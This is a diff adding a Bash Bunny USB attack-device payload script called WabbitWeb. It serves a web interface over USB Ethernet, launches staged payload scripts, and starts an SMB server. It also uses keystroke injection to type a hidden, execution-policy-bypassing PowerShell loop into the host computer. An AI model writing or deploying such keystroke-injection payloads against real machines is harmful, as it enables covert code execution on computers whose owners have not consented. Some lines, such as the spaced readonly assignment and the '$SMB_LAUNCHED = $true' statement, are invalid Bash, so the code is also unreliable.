@@ -1,0 +1,150 @@
+# WabbitWeb
+# 
+# Attack modes: RNDIS
+
+GET HOST_IP
+GET SWITCH_POSITION
+
+# Just so we don't try and start the SMB server 50 times over..
+SMB_LAUNCHED = $false
+
+# Switch directory
+readonly PAYLOAD_DIR="/root/udisk/payloads/$SWITCH_POSITION"
+# Log paths
+readonly LOG_FILE="/root/udisk/logs/WabbitWeb.log"
+readonly LA_FILE="/root/udisk/logs/WabbitWeb_A.log"
+readonly LB_FILE="/root/udisk/logs/WabbitWeb_B.log"
+readonly LC_FILE="/root/udisk/logs/WabbitWeb_C.log"
+readonly SMB_FILE = "/root/udisk/logs/WabbitWeb_SMB.log"
+
+# Let's start!
+LED SETUP
+mkdir -p "/root/udisk/logs"
+echo "[+]--WABBITWEB STARTED--[+]" >> $LOG_FILE
+if ! [ -d "$PAYLOAD_DIR/ww/" ]
+then
+	LED FAIL2
+	echo "- Working directory not found" >> $LOG_FILE
+	exit 1
+fi
+mkdir -p "$PAYLOAD_DIR/ww/mfs"
+
+# Mount the Bunny's udisk
+echo "+ Mounting file system.." >> $LOG_FILE
+mount -o bind "/root/udisk" "$PAYLOAD_DIR/ww/mfs"
+if [ -d "$PAYLOAD_DIR/ww/mfs/payloads" ]
+then
+	echo "+ Successfully mounted directory" >> $LOG_FILE
+else
+	LED FAIL3
+	echo "- Failed to mount directory" >> $LOG_FILE
+	exit 1
+fi
+
+# Prepare the engine
+LED STAGE1
+ATTACKMODE RNDIS_ETHERNET
+
+# Start. The. WEBSERVER!
+echo "+ Starting webserver.." >> $LOG_FILE
+cd $PAYLOAD_DIR/ww/
+python scripts/s.py &
+
+# Sets LED to a slowly flashing blue so we know everything is fine
+LED B SLOW
+
+# Wait for server to shutdown
+echo "+ Waiting for commands.." >> $LOG_FILE
+while ! [ -f "SHUTDOWN" ]
+do
+	# Letter A was started
+	if [ -f "LAUNCHER_A" ]
+	then
+		LED B
+		echo "+ Launching Payload A.." >> $LOG_FILE
+		source "$PAYLOAD_DIR/ww/scripts/la.sh" >> $LA_FILE
+		echo "+ Payload A completed" >> $LOG_FILE
+		echo "+ Waiting for commands.." >> $LOG_FILE
+		sleep 2
+		LED B SLOW
+		rm "LAUNCHER_A"
+	fi
+	# Letter B was started
+	if [ -f "LAUNCHER_B" ]
+	then
+		LED B
+		echo "+ Launching Payload B.." >> $LOG_FILE
+		source "$PAYLOAD_DIR/ww/scripts/lb.sh" >> $LB_FILE
+		echo "+ Payload B completed" >> $LOG_FILE
+		echo "+ Waiting for commands.." >> $LOG_FILE
+		sleep 2
+		LED B SLOW
+		rm "LAUNCHER_B"
+	fi
+	# Letter C was started
+	if [ -f "LAUNCHER_C" ]
+	then
+		LED B
+		echo "+ Launching Payload C.." >> $LOG_FILE
+		source "$PAYLOAD_DIR/ww/scripts/lc.sh" >> $LC_FILE
+		echo "+ Payload C completed" >> $LOG_FILE
+		echo "+ Waiting for commands.." >> $LOG_FILE
+		sleep 2
+		LED B SLOW
+		rm "LAUNCHER_C"
+	fi
+	# SMB server was started
+	if	[ -f "LAUNCHER_SMB" ]
+	then
+		LED C
+		if [ -d "/tools/impacket" ]
+		then
+			if [ $SMB_LAUNCHED = $false ]
+			then
+				LED C FAST
+				$SMB_LAUNCHED = $true
+				echo "+ Attempting to launch SMB.." >> $LOG_FILE
+				python /tools/impacket/examples/smbserver.py -comment "Who needs a locker when you have a server?" s "$PAYLOAD_DIR/ww/" >> $SMB_FILE &
+				echo "+ SMB server started.." >> $LOG_FILE
+			fi
+			echo "+ Launching file browser to SMB server.." >> $LOG_FILE
+			# Just wanna start powershell real quick..(sets up a loop to wait for the Bunny to get ready, then starts Windows Explorer - pointed at the SMB server)
+			ATTACKMODE HID
+			RUN WIN "powershell -windowstyle hidden -exec Bypass \"while (\$true) { If ((New-Object net.sockets.tcpclient ($HOST_IP,445)).Connected) { ii \\\\$HOST_IP\\s; exit } }\""
+			sleep 2
+			# Okay, back to business..
+			ATTACKMODE RNDIS_ETHERNET
+			# Trip the powershell loop (suddenly we can see the Bunny!)
+			echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all
+			sleep 1
+			# Aww, it's gone again..
+			echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all
+			echo "+ Waiting for commands.." >> $LOG_FILE
+		else
+			LED FAIL1
+		fi
+		sleep 2
+		LED C SLOW
+		rm "LAUNCHER_SMB"
+	fi
+	sleep 1
+done
+
+# Shutdown sequence initiated
+LED G
+# Sync the file system..
+echo "+ Syncing file system.." >> $LOG_FILE
+sync
+sleep 1
+sync
+echo "+ Unmounting mount directory.." >> $LOG_FILE
+# Unmount the mount directory..
+umount "$PAYLOAD_DIR/ww/mfs"
+# Delete the mount directory..
+rm -r "$PAYLOAD_DIR/ww/mfs"
+# Delete shutdown file (don't want to instantly shutdown next time!)
+rm "$PAYLOAD_DIR/ww/SHUTDOWN"
+echo "[+]--WABBITWEB STOPPED--[+]" >> $LOG_FILE
+LED FINISH
+sleep 1
+LED OFF
